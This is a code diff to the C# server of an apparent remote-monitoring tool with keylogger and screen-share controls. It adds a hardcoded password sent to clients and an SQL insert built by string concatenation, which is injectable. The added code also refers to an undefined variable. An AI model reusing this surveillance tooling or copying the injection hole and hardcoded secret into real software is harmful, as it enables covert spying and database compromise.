@@ -13,6 +13,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Data.SqlClient;
 
 namespace Server
 {
@@ -29,8 +30,7 @@ namespace Server
         private NetworkStream ShareScreenStream;
         Thread ShowThread;
 
-        private Rectangle buttonOriginalRectangle;
-        private Rectangle originalFormSize;
+        
         public ManageForm(TcpClient k, TcpClient ss, TcpClient m)
         {
             klogClient = k;
@@ -39,7 +39,39 @@ namespace Server
             CommandStream = m.GetStream();
             //sendShare();
 
+            //Send password;
+            string password = "123456";
+            string secret = "pass:" + password;
+            byte[] data = Encoding.ASCII.GetBytes(secret);
+
+            //save Pass to database
+            string remoteEndPoint = client.Client.RemoteEndPoint.ToString();
+            string[] parts = remoteEndPoint.Split(':');
+
+            string ipAddress = parts[0];
+            string port = parts[1];
+
+            //LoadPass2Dtb(ipAddress, port, password);
+
+            CommandStream.Write(data, 0, data.Length);
+
             InitializeComponent();
+        }
+
+        void LoadPass2Dtb(string ip, string port, string pass)
+        {
+            SqlConnection connection = new SqlConnection(@"Data Source=DESKTOP-TOI9180\NIKOTINE;Initial Catalog=Pass;Integrated Security=True");
+
+            SqlCommand command = new SqlCommand(@"INSERT INTO [dbo].[table_1]
+           ([IP]
+           ,[port]
+           ,[password])
+        VALUES
+            ('" + ip + "','" + port + "','" + pass + "')", connection
+             );
+            connection.Open();
+            command.ExecuteNonQuery();
+            connection.Close();
         }
 
         void sendShare()
@@ -57,7 +89,7 @@ namespace Server
             this.Location = new Point(0, 0);
             this.Size = new Size(w, h);
         }
-
+         
         private void Key_logger_Click(object sender, EventArgs e)
         {
             try
@@ -94,7 +126,32 @@ namespace Server
 
             }
         }
+        /*                if(isShowThreadAlive == false)
+                {
+                    CommandStream = client.GetStream();
+                    byte[] data = Encoding.ASCII.GetBytes("Share-Screen");
+                    CommandStream.Write(data, 0, data.Length);
 
+                    share_screen.Text = "Stop share";
+
+                    ShowThread = new Thread(ScreenShow);
+                    ShowThread.Start();
+                    ShowThread.IsBackground = true;
+                    isShowThreadAlive = true;
+                }
+                else
+                {
+                    CommandStream = client.GetStream();
+                    byte[] data = Encoding.ASCII.GetBytes("Stop-Share-Screen");
+                    CommandStream.Write(data, 0, data.Length);
+
+                    share_screen.Text = "Share Screen";
+
+                    ShowThread.Abort();
+                    ScreenPicture.Image = null;
+                    isShowThreadAlive = false;
+                }
+        */
         private void ScreenShow()
         {
 
